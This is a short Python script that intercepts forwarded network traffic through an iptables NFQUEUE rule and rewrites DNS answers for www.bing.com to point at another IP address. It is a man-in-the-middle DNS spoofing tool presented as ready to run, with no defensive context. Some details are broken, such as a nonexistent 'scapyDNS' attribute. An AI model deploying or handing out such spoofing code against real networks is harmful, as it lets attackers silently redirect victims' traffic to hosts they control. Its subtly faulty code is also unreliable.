import scapy.all as scapy
import subprocess
import netfilterqueue

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSRR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname=qname, rdata="8.8.8.8")
            scapy_packet[scapy.scapyDNS].an = answer
            scapy_packet[scapy.scapyDNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))
    packet.accept()

subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE"])

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

subprocess.call(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
